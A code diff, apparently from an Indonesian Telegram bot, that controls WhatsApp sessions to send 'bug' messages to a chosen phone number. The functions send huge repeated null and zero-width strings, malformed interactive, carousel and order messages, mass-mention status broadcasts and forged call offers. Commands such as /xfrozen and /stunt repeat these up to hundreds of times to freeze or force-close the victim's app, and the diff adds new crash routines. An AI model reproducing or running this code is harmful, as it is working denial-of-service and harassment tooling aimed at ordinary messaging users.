@@ -5,12 +5,6 @@ const {
   DisconnectReason,
   generateWAMessageFromContent,
   useMultiFileAuthState,
-  encodeSignedDeviceIdentity,
-  jidEncode,
-  jidDecode,
-  encodeWAMessage,
-  patchMessageBeforeSending,
-  encodeNewsletterMessage
 } = require("@denzz221/baileys");
 const fs = require("fs");
 const P = require("pino");
@@ -163,89 +157,27 @@ const getUptime = () => {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// Fungsi cek koneksi socket
-async function isSocketConnected(sock) {
-  try {
-    if (!sock || !sock.user) return false;
-    const state = sock.ev.emit('connection.update', {});
-    return true;
-  } catch {
-    return false;
+// Fungsi generate message ID
+function generateMessageId() {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  let result = '';
+  for (let i = 0; i < 16; i++) {
+    result += chars.charAt(Math.floor(Math.random() * chars.length));
   }
+  return result;
 }
 
-// Fungsi kirim pesan dengan retry dan reconnect
-async function safeSendMessage(sock, target, messageFunc, retries = 3) {
-  for (let i = 0; i < retries; i++) {
-    try {
-      if (!sock || !sock.user) {
-        console.log(`⚠️ Socket tidak valid, cari sesi baru...`);
-        const newSock = await getValidSocket();
-        if (newSock) {
-          sock = newSock;
-        } else {
-          await sleep(2000);
-          continue;
-        }
-      }
-      await messageFunc(sock, target);
-      return true;
-    } catch (error) {
-      console.log(`❌ Gagal kirim (attempt ${i + 1}/${retries}):`, error.message);
-      if (error.message?.includes('Connection Closed') || error.output?.statusCode === 428) {
-        console.log(`🔄 Koneksi terputus, mencoba reconnect...`);
-        const newSock = await reconnectAnySession();
-        if (newSock) {
-          sock = newSock;
-        }
-      }
-      await sleep(2000);
-    }
+// Fungsi validasi target JID
+function validateJid(target) {
+  if (!target || typeof target !== 'string') return null;
+  if (target.includes('@s.whatsapp.net') || target.includes('@g.us')) {
+    return target;
   }
-  return false;
-}
-
-async function getValidSocket() {
-  if (sessions.size > 0) {
-    for (const [number, sock] of sessions) {
-      try {
-        if (sock && sock.user) {
-          return sock;
-        }
-      } catch (e) {}
-    }
+  const rawNumber = target.replace(/[^0-9]/g, '');
+  if (rawNumber.length > 0) {
+    return `${rawNumber}@s.whatsapp.net`;
   }
   return null;
-}
-
-async function reconnectAnySession() {
-  try {
-    if (!fs.existsSync(SESSIONS_DIR)) return null;
-    const { state, saveCreds } = await useMultiFileAuthState(SESSIONS_DIR);
-    const sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: P({ level: "silent" }),
-      defaultQueryTimeoutMs: undefined,
-      keepAliveIntervalMs: 60000,
-      connectTimeoutMs: 60000,
-    });
-    
-    return new Promise((resolve) => {
-      const timeout = setTimeout(() => resolve(null), 15000);
-      sock.ev.once("connection.update", (update) => {
-        clearTimeout(timeout);
-        if (update.connection === "open") {
-          resolve(sock);
-        } else {
-          resolve(null);
-        }
-      });
-    });
-  } catch (error) {
-    console.error("Reconnect error:", error);
-    return null;
-  }
 }
 
 // Middleware untuk cek group only
@@ -542,98 +474,90 @@ async function connectToWhatsApp(botNumber, chatId) {
 // ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //
 
 async function VsxCrashDelay(sock, target) {
-  await safeSendMessage(sock, target, async (s, t) => {
-    await s.sendMessage(t, { text: "\u0000".repeat(900000) });
-  });
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  await sock.sendMessage(validTarget, { text: "\u0000".repeat(900000) });
 }
 
 async function DelayHard(sock, target) {
-  await safeSendMessage(sock, target, async (s, t) => {
-    await s.sendMessage(t, { text: "x".repeat(800000) });
-  });
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  await sock.sendMessage(validTarget, { text: "x".repeat(800000) });
 }
 
 async function StickerFC(sock, target) {
-  await safeSendMessage(sock, target, async (s, t) => {
-    await s.sendMessage(t, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
-  });
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  await sock.sendMessage(validTarget, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
 }
 
 async function Freeze(sock, target) {
-  await safeSendMessage(sock, target, async (s, t) => {
-    await s.relayMessage(t, {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: "FREEZE", format: "DEFAULT" },
-            nativeFlowResponseMessage: {
-              name: "cta_FREEZE",
-              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
-              version: 3
-            }
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  await sock.relayMessage(validTarget, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "FREEZE", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "cta_FREEZE",
+            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
+            version: 3
           }
         }
       }
-    }, { participant: { jid: t } });
-  });
+    }
+  }, { participant: { jid: validTarget } });
 }
 
 async function invisfcmsg(sock, target) {
-  await safeSendMessage(sock, target, async (s, t) => {
-    await s.sendMessage(t, { text: "\u200b".repeat(800000) });
-  });
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  await sock.sendMessage(validTarget, { text: "\u200b".repeat(800000) });
 }
 
 async function VnXDelayXFcNew(sock, target) {
-  await safeSendMessage(sock, target, async (s, t) => {
-    await s.relayMessage(t, {
-      viewOnceMessage: {
-        message: {
-          interactiveResponseMessage: {
-            body: { text: "VnX", format: "DEFAULT" },
-            nativeFlowResponseMessage: {
-              name: "cta_VnX",
-              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
-              version: 3,
-              contextInfo: {
-                isForwarded: true,
-                forwardingScore: 999,
-                quotedMessage: {
-                  stickerMessage: {
-                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                    mimetype: "image/webp",
-                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                    fileLength: "10610",
-                    mediaKeyTimestamp: "1775044724",
-                    stickerSentTs: "1775044724091"
-                  }
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  await sock.relayMessage(validTarget, {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { text: "VnX", format: "DEFAULT" },
+          nativeFlowResponseMessage: {
+            name: "cta_VnX",
+            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
+            version: 3,
+            contextInfo: {
+              isForwarded: true,
+              forwardingScore: 999,
+              quotedMessage: {
+                stickerMessage: {
+                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                  mimetype: "image/webp",
+                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                  fileLength: "10610",
+                  mediaKeyTimestamp: "1775044724",
+                  stickerSentTs: "1775044724091"
                 }
               }
             }
           }
         }
       }
-    }, { participant: { jid: t } });
-  });
+    }
+  }, { participant: { jid: validTarget } });
 }
 
 async function delaynewinvisibleVnX(sock, target) {
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
+  
   while (true) {
     try {
-      if (!sock || !sock.user) {
-        console.log(`⚠️ Koneksi putus, reconnect...`);
-        const newSock = await reconnectAnySession();
-        if (newSock) {
-          sock = newSock;
-        } else {
-          await sleep(5000);
-          continue;
-        }
-      }
-      
       const MsgNew = {
         groupStatusMessageV2: {
           message: {
@@ -653,32 +577,277 @@ async function delaynewinvisibleVnX(sock, target) {
         }
       };
 
-      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
-      
-      console.log(`✅ VnX Sent to ${target}`);
+      await sock.relayMessage(validTarget, MsgNew, { participant: { jid: validTarget } });
+      console.log(`✅ VnX Sent to ${validTarget}`);
       await sleep(1200);
-
     } catch (e) {
       console.log("❌ Error:", e.message);
-      if (e.message?.includes('Connection Closed') || e.output?.statusCode === 428) {
-        console.log(`🔄 Mencoba reconnect...`);
-        const newSock = await reconnectAnySession();
-        if (newSock) {
-          sock = newSock;
-        }
-      }
       await sleep(5000);
     }
   }
 }
 
 async function VisiNoob(sock, target) {
+  const validTarget = validateJid(target);
+  if (!validTarget) return;
   for (let i = 0; i < 50; i++) {
-    await safeSendMessage(sock, target, async (s, t) => {
-      await s.sendMessage(t, { text: "\u200e".repeat(600000) });
-    });
+    await sock.sendMessage(validTarget, { text: "\u200e".repeat(600000) });
     await sleep(100);
   }
+}
+
+// ================= FUNGSI ORDER SECRET ================= //
+
+async function OrderSecret(sock, target) {
+  const validTarget = validateJid(target);
+  if (!validTarget) {
+    console.log("❌ Target tidak valid:", target);
+    return;
+  }
+  
+  const RuxzSecret = {
+    orderMessage: {
+      orderId: "4U7S4RWPS3C",
+      itemCount: 99999999,
+      status: "CANCELLED",
+      surface: 2,
+      sellerJid: "x",
+      totalAmount1000: 99999999,
+      currencyCodeIso4217: "IDR",
+      orderValue: "Rp",
+      contextInfo: {
+        stanzaId: "3EB0F1A2B3C4D5E6",
+        participant: validTarget,
+        quotedMessage: null,
+        mentionedJid: Array.from({ length: 100 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
+      }
+    }
+  };
+
+  for (let i = 0; i < 30; i++) {
+    await sock.relayMessage(
+      "status@broadcast",
+      RuxzSecret,
+      {
+        messageId: generateMessageId(),
+        statusJidList: [validTarget],
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {},
+            content: [
+              {
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: validTarget },
+                    content: undefined
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
+    console.log(`✅ OrderSecret sent to ${validTarget} (${i + 1}/30)`);
+    await sleep(1000);
+  }
+}
+
+// ================= FUNGSI FC NEW ================= //
+
+async function FcNeww(sock, target) {
+  const validTarget = validateJid(target);
+  if (!validTarget) {
+    console.log("❌ Target tidak valid:", target);
+    return;
+  }
+  
+  const myJid = sock.user?.id?.split(':')[0] + '@s.whatsapp.net';
+  if (!myJid || validTarget === myJid) return;
+
+  const fcMessage = {
+    viewOnceMessage: {
+      message: {
+        carouselMessage: {
+          cards: [
+            {
+              header: {
+                title: '\u0000.VnX'.repeat(500),
+                hasMediaAttachment: true,
+                stickerMessage: {
+                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                  mimetype: "image/webp",
+                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                  fileLength: "10610",
+                  mediaKeyTimestamp: "1775044724",
+                  stickerSentTs: "1775044724091"
+                }
+              }
+            }
+          ]
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(validTarget, fcMessage, {
+    participant: { jid: validTarget }
+  });
+
+  console.log(`✅ FcNeww sent to ${validTarget}`);
+}
+
+// ================= FUNGSI FC CALL INVIS NEW ================= //
+
+async function FcCallInvisnew(sock, target) {
+  const validTarget = validateJid(target);
+  if (!validTarget) {
+    console.log("❌ Target tidak valid:", target);
+    return;
+  }
+  
+  const {
+    encodeSignedDeviceIdentity,
+    jidDecode,
+    encodeWAMessage,
+  } = require("@denzz221/baileys");
+  
+  let devices = (
+    await sock.getUSyncDevices([validTarget], false, false)
+  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+
+  await sock.assertSessions(devices);
+
+  let privt = () => {
+    let map = {};
+    return {
+      mutex(key, fn) {
+        map[key] ??= { task: Promise.resolve() };
+        map[key].task = (async prev => {
+          try { await prev; } catch {}
+          return fn();
+        })(map[key].task);
+        return map[key].task;
+      }
+    };
+  };
+
+  let vion = privt();
+  let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
+  let vionoc = sock.encodeWAMessage?.bind(sock);
+
+  const originalCreateParticipantNodes = sock.createParticipantNodes.bind(sock);
+  
+  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
+    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
+
+    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
+    let memeg = Array.isArray(patched)
+      ? patched
+      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
+
+    let { id: meId, lid: meLid } = sock.authState.creds.me;
+    let omak = meLid ? jidDecode(meLid)?.user : null;
+    let shouldIncludeDeviceIdentity = false;
+
+    let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
+      let { user: targetUser } = jidDecode(jid);
+      let { user: ownPnUser } = jidDecode(meId);
+      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
+      let y = jid === meId || jid === meLid;
+      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
+
+      let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));
+
+      return vion.mutex(jid, async () => {
+        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
+        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
+        return {
+          tag: 'to',
+          attrs: { jid },
+          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
+        };
+      });
+    }));
+
+    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
+  };
+
+  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
+
+  let vionlast = {
+    tag: "call",
+    attrs: { to: validTarget, id: sock.generateMessageTag(), from: sock.user.id },
+    content: [{
+      tag: "offer",
+      attrs: {
+        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
+        "call-creator": sock.user.id
+      },
+      content: [
+        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+        {
+          tag: "video",
+          attrs: {
+            orientation: "0",
+            screen_width: "1920",
+            screen_height: "1080",
+            device_orientation: "0",
+            enc: "vp8",
+            dec: "vp8"
+          }
+        },
+        { tag: "net", attrs: { medium: "3" } },
+        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
+        { tag: "encopt", attrs: { keygen: "2" } },
+        { tag: "destination", attrs: {}, content: destinations },
+        ...(shouldIncludeDeviceIdentity ? [{
+          tag: "device-identity",
+          attrs: {},
+          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
+        }] : [])
+      ]
+    }]
+  };
+  await sock.sendNode(vionlast);
+
+  const msg2 = {
+    groupStatusMessageV2: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+          mimetype: "image/webp",
+          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+          fileLength: "10610",
+          mediaKeyTimestamp: "1775044724",
+          stickerSentTs: "1775044724091"
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(validTarget, msg2, {
+    participant: { jid: validTarget },
+    messageId: null,
+    userJid: validTarget,
+    quoted: null
+  });
+  
+  // Restore original function
+  sock.createParticipantNodes = originalCreateParticipantNodes;
+  
+  console.log(`✅ FcCallInvisnew sent to ${validTarget}`);
 }
 
 // ================= HELPER FUNCTIONS ================= //
@@ -917,7 +1086,7 @@ bot.onText(/\/updatecmd (.+)/, async (msg, match) => {
       await bot.sendMessage(chatId, `✅ BERHASIL UPDATE COMMAND /${cmdName}!
       
 📌 Command: /${cmdName}
-🔄 Loop: ${loopCount}x (sebelumnya diubah)
+🔄 Loop: ${loopCount}x
 ⏱️ Sleep: ${sleepMs}ms
 
 🔄 Restarting bot dalam 3 detik...`);
@@ -1024,9 +1193,7 @@ bot.onText(/\\/${cmdName}(?:\\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < ${loopCount}; i++) {
-      await safeSendMessage(sock, target, async (s, t) => {
-        await ${functionName}(s, t);
-      });
+      await ${functionName}(sock, target);
       await sleep(${sleepMs});
       console.log(chalk.green(\`✅ Success Sending to \${target}\`));
     }
@@ -1076,9 +1243,8 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
     return;
   }
   
-  // Cek apakah ada parameter
   if (!match || !match[1]) {
-    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara 1 (Reply file .js):\nKirim file .js, lalu reply file tersebut dengan perintah ini.\n\nCara 2 (Langsung):\nKirim fungsi sebagai teks, lalu reply pesan fungsi tersebut dengan perintah ini.\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
+    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara 1 (Reply file .js):\nKirim file .js, lalu reply file tersebut dengan perintah ini.\n\nCara 2 (Reply teks):\nKirim fungsi sebagai teks, lalu reply pesan fungsi tersebut dengan perintah ini.\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
     return;
   }
   
@@ -1101,10 +1267,8 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
   let functionBody = null;
   let source = "";
   
-  // Cek apakah reply ke file atau ke text message
   if (msg.reply_to_message) {
     if (msg.reply_to_message.document) {
-      // Reply ke file .js
       const fileId = msg.reply_to_message.document.file_id;
       const fileName = msg.reply_to_message.document.file_name;
       
@@ -1126,33 +1290,24 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
       }
       
     } else if (msg.reply_to_message.text) {
-      // Reply ke pesan teks yang berisi fungsi
       source = "text";
       functionBody = msg.reply_to_message.text.trim();
       await bot.sendMessage(chatId, `🔄 Memproses fungsi dari pesan teks...`);
     }
   }
   
-  // Jika tidak ada reply sama sekali
   if (!functionBody) {
     await bot.sendMessage(chatId, "❌ Reply ke file .js ATAU ke pesan teks yang berisi fungsi!\n\nKirim file .js atau tulis fungsi, lalu reply dengan /addfunccmd");
     return;
   }
   
-  // Cek apakah fungsi dengan nama yang dimaksud ada di body
   if (!functionBody.includes(`async function ${functionName}`) && !functionBody.includes(`function ${functionName}`)) {
     await bot.sendMessage(chatId, `❌ Fungsi dengan nama "${functionName}" tidak ditemukan di ${source === "file" ? "file" : "pesan"}!\n\nPastikan berisi:\nasync function ${functionName}(sock, target) { ... }`);
     return;
   }
   
-  // Format ulang fungsi jika perlu
   if (!functionBody.includes('async function')) {
     functionBody = `async ${functionBody}`;
-  }
-  
-  // Tambahkan safeSendMessage wrapper ke fungsi jika belum ada
-  if (!functionBody.includes('safeSendMessage')) {
-    // Biarkan tetap original, nanti di command sudah dibungkus safeSendMessage
   }
   
   const functionAdded = await addNewFunctionToFile(functionBody, functionName);
@@ -1401,7 +1556,7 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ sanjiva (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1413,9 +1568,7 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 10; i++) {
-      await safeSendMessage(sock, target, async (s, t) => {
-        await delaynewinvisibleVnX(s, t);
-      });
+      await delaynewinvisibleVnX(sock, target);
       await sleep(2);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
@@ -1460,7 +1613,7 @@ bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ xtest (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1472,9 +1625,7 @@ bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 400; i++) {
-      await safeSendMessage(sock, target, async (s, t) => {
-        await StickerFC(s, t);
-      });
+      await StickerFC(sock, target);
       await sleep(2000);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
@@ -1519,7 +1670,7 @@ bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ sanjixa (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1531,9 +1682,7 @@ bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 3; i++) {
-      await safeSendMessage(sock, target, async (s, t) => {
-        await VsxCrashDelay(s, t);
-      });
+      await VsxCrashDelay(sock, target);
       await sleep(300);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
@@ -1578,7 +1727,7 @@ bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ xfrozen (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1590,9 +1739,7 @@ bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 300; i++) {
-      await safeSendMessage(sock, target, async (s, t) => {
-        await Freeze(s, t);
-      });
+      await Freeze(sock, target);
       await sleep(3000);
       console.log(chalk.green(`✅ Success Sending Frezee to ${target}`));
     }
@@ -1637,7 +1784,7 @@ bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ stuck (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1648,9 +1795,7 @@ bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await safeSendMessage(sock, target, async (s, t) => {
-      await invisfcmsg(s, t);
-    });
+    await invisfcmsg(sock, target);
     await sleep(2000);
     
     console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
@@ -1695,7 +1840,7 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ stunt (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1706,12 +1851,10 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    for (let i = 0; i < 500; i++) {
-      await safeSendMessage(sock, target, async (s, t) => {
-        await VnXDelayXFcNew(s, t);
-      });
+    for (let i = 0; i < 400; i++) {
+      await FcCallInvisnew(sock, target);
       await sleep(2000);
-      console.log(chalk.green(`✅ Success Sending Force Close to ${target}`));
+      console.log(chalk.green(`✅ Success Sending FcCallInvisnew to ${target}`));
     }
     
   } catch (error) {
@@ -1754,7 +1897,7 @@ bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    let sock = sessions.values().next().value;
+    const sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ streak (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1765,9 +1908,7 @@ bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await safeSendMessage(sock, target, async (s, t) => {
-      await VisiNoob(s, t);
-    });
+    await VisiNoob(sock, target);
     
     console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
     
@@ -1818,7 +1959,7 @@ bot.onText(/\/menu/, async (msg) => {
 │ ❀ /sanjiva <number> - delay invis brutality combo
 │ ❀ /sanjixa <number> - delay invis hard
 │ ❀ /xfrozen <number> - freeze invisible 
-│ ❀ /stunt <number> - fc invis andro
+│ ❀ /stunt <number> - fc call invis
 │ ❀ /stuck <number> - fc invis msg andro 
 ╰═════════════════❀
 ╭═════════════════❀
